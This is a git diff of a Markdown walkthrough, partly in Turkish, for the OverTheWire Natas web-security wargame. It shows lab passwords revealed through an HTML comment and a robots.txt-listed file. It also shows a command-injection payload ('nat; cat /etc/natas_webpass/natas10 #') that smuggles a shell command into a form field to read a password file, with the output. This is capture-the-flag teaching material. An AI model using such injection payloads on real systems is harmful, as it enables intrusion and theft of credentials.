@@ -58,7 +58,9 @@ next level on this page, but rightclicking has been blocked!
 <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 </div>
 ```
+
 ![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi")
+
 
 Natas Level 1 → Level 2
 ======
@@ -122,6 +124,7 @@ http://natas3.natas.labs.overthewire.org/robots.txt
 User-agent: *
 Disallow: /s3cr3t/
 ```
+
 ```terminal
 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
@@ -331,7 +334,7 @@ if($key != "") {
 
 key variableındaki değeri dictionary içerisinden grep ile getirmektedir. Terminalde aynı satırda bir fazla, birbirinden farklı komutlar operatörler yardımıyla çalıştırılabilmektedir. 
 
-**nat:** herhangi bir değer, key variable için yazılmıştır.
+**nat:** herhangi bir değer, key variable için yazılmıştır, anlamsızdır.
 
 **;** ifadesiyle yeni bir komut yazılacağı belirtilmiştir.
 
@@ -341,9 +344,8 @@ key variableındaki değeri dictionary içerisinden grep ile getirmektedir. Term
 nat; cat /etc/natas_webpass/natas10 #
 ```
 
-```termilnal
+```
 Output:
-
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ```
 
